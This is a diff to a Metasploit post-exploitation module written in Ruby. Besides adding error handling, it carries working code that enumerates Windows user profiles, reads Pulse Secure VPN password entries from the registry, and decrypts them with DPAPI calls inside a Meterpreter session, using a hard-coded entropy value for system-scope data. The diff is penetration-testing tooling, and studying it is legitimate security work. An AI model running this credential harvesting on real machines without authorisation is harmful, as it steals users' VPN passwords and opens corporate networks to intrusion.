@@ -50,45 +50,50 @@ class MetasploitModule < Msf::Post
   # @return [String] Decrypted value or empty string in case of failure.
   #
   def decrypt_reg(data, entropy)
-    rg = session.railgun
-    pid = session.sys.process.getpid
-    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+    begin
+      rg = session.railgun
+      pid = session.sys.process.getpid
+      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
-    # write entropy to memory
-    emem = process.memory.allocate(128)
-    process.memory.write(emem, entropy)
-    # write encrypted data to memory
-    mem = process.memory.allocate(128)
-    process.memory.write(mem, data)
+      # write entropy to memory
+      emem = process.memory.allocate(128)
+      process.memory.write(emem, entropy)
+      # write encrypted data to memory
+      mem = process.memory.allocate(128)
+      process.memory.write(mem, data)
 
-    #  enumerate all processes to find the one that we're are currently executing as,
-    #  and then fetch the architecture attribute of that process by doing ["arch"]
-    #  to check if it is an 32bits process or not.
-    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
-      addr = [mem].pack('V')
-      len = [data.length].pack('V')
+      #  enumerate all processes to find the one that we're are currently executing as,
+      #  and then fetch the architecture attribute of that process by doing ["arch"]
+      #  to check if it is an 32bits process or not.
+      if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+        addr = [mem].pack('V')
+        len = [data.length].pack('V')
 
-      eaddr = [emem].pack('V')
-      elen = [entropy.length].pack('V')
+        eaddr = [emem].pack('V')
+        elen = [entropy.length].pack('V')
 
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
-      len, addr = ret['pDataOut'].unpack('V2')
-    else
-      # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
-      addr = Rex::Text.pack_int64le(mem)
-      len = Rex::Text.pack_int64le(data.length)
+        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
+        len, addr = ret['pDataOut'].unpack('V2')
+      else
+        # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
+        addr = Rex::Text.pack_int64le(mem)
+        len = Rex::Text.pack_int64le(data.length)
 
-      eaddr = Rex::Text.pack_int64le(emem)
-      elen = Rex::Text.pack_int64le(entropy.length)
+        eaddr = Rex::Text.pack_int64le(emem)
+        elen = Rex::Text.pack_int64le(entropy.length)
 
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
-      p_data = ret['pDataOut'].unpack('VVVV')
-      len = p_data[0] + (p_data[1] << 32)
-      addr = p_data[2] + (p_data[3] << 32)
+        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
+        p_data = ret['pDataOut'].unpack('VVVV')
+        len = p_data[0] + (p_data[1] << 32)
+        addr = p_data[2] + (p_data[3] << 32)
+      end
+      return '' if len == 0
+
+      return process.memory.read(addr, len)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
     end
-    return '' if len == 0
-
-    return process.memory.read(addr, len)
+    return ''
   end
 
   # Parse IVEs definitions from Pulse Secure Connect client connection store
@@ -174,81 +179,85 @@ class MetasploitModule < Msf::Post
   end
 
   def find_creds
+    begin
+      # If we execute with elevated privileges, we can go through all registry values
+      # so we load all profiles. If we run without privileges, we just load our current
+      # user profile. We have to do that otherwise we try to access registry values that
+      # we are not allwoed to, triggering a 'Profile doesn't exist or cannot be accessed'
+      # error.
+      if is_system?
+        profiles = grab_user_profiles
+      else
+        profiles = [{ 'SID' => session.sys.config.getsid }]
+      end
+      creds = []
+      # we get connection ives
+      ives = find_ives
+      # for each user profile, we check for potential connection ive
+      profiles.each do |profile|
+        key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
+        next unless key_names
+        key_names.each do |key_name|
+          ive_index = key_name[4..-1] # remove 'ive:'
+          # We get the encrypted password value from registry
+          reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
+          vals = registry_enumvals(reg_path)
 
-    # If we execute with elevated privileges, we can go through all registry values
-    # so we load all profiles. If we run without privileges, we just load our current
-    # user profile. We have to do that otherwise we try to access registry values that
-    # we are not allwoed to, triggering a 'Profile doesn't exist or cannot be accessed'
-    # error.
-    if is_system?
-      profiles = grab_user_profiles
-    else
-      profiles = [{ 'SID' => session.sys.config.getsid }]
-    end
-    creds = []
-    # we get connection ives
-    ives = find_ives
-    # for each user profile, we check for potential connection ive
-    profiles.each do |profile|
-      key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
-      next unless key_names
-      key_names.each do |key_name|
-        ive_index = key_name[4..-1] # remove 'ive:'
-        # We get the encrypted password value from registry
-        reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
-        vals = registry_enumvals(reg_path)
+          next unless vals
 
-        next unless vals
+          vals.each do |val|
+            data = registry_getvaldata(reg_path, val)
+            if is_system? and data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
+                # this means data was encrypted by elevated user using LocalSystem scope and fixed
+                # pOptionalEntropy value, adjusting parameters
+                data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
+                entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
+            else
+              # convert IVE index to DPAPI pOptionalEntropy value like PSC does
+              entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack("c*")
+            end
 
-        vals.each do |val|
-          data = registry_getvaldata(reg_path, val)
-          if is_system? and data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
-              # this means data was encrypted by elevated user using LocalSystem scope and fixed
-              # pOptionalEntropy value, adjusting parameters
-              data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
-              entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
-          else
-            # convert IVE index to DPAPI pOptionalEntropy value like PSC does
-            entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack("c*")
+            if !data.starts_with?("\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8Cz\x00\xC0O\xC2\x97\xEB")
+              next
+            end
+
+            decrypted = decrypt_reg(data, entropy)
+            next unless decrypted != ''
+
+            if !ives.key?(ive_index)
+              # If the ive_index is not in gathered IVEs, this means it's a leftover from
+              # previously installed Pulse Secure Connect client versions.
+              #
+              # IVE keys of existing connections can get removed from connstore.dat and connstore.tmp
+              # when the new version is executed and that the client has more than one defined connection,
+              # leading to them not being inserted in the 'ives' array.
+              #
+              # However, the registry values are not wiped when Pulse Secure Connect is upgraded
+              # to a new version (including versions that fix CVE-2020-8956).
+              #
+              # TL;DR; We can still decrypt the password, but we're missing the URI and friendly
+              # name of that connection.
+              ives[ive_index] = {}
+              ives[ive_index]['connection-source'] = 'user'
+              ives[ive_index]['friendly-name'] = 'unknown'
+              ives[ive_index]['uri'] = 'unknown'
+              ives[ive_index]['creds'] = []
+            end
+            ives[ive_index]['creds'].append(
+              {
+                'username' => get_username(profile['SID'], ive_index),
+                'password' => decrypted.remove("\x00")
+              }
+            )
+            creds << ives[ive_index]
           end
-
-          if !data.starts_with?("\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8Cz\x00\xC0O\xC2\x97\xEB")
-            next
-          end
-
-          decrypted = decrypt_reg(data, entropy)
-          next unless decrypted != ''
-
-          if !ives.key?(ive_index)
-            # If the ive_index is not in gathered IVEs, this means it's a leftover from
-            # previously installed Pulse Secure Connect client versions.
-            #
-            # IVE keys of existing connections can get removed from connstore.dat and connstore.tmp
-            # when the new version is executed and that the client has more than one defined connection,
-            # leading to them not being inserted in the 'ives' array.
-            #
-            # However, the registry values are not wiped when Pulse Secure Connect is upgraded
-            # to a new version (including versions that fix CVE-2020-8956).
-            #
-            # TL;DR; We can still decrypt the password, but we're missing the URI and friendly
-            # name of that connection.
-            ives[ive_index] = {}
-            ives[ive_index]['connection-source'] = 'user'
-            ives[ive_index]['friendly-name'] = 'unknown'
-            ives[ive_index]['uri'] = 'unknown'
-            ives[ive_index]['creds'] = []
-          end
-          ives[ive_index]['creds'].append(
-            {
-              'username' => get_username(profile['SID'], ive_index),
-              'password' => decrypted.remove("\x00")
-            }
-          )
-          creds << ives[ive_index]
         end
       end
+      return creds
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
     end
-    return creds
+    return nil
   end
 
   def gather_creds
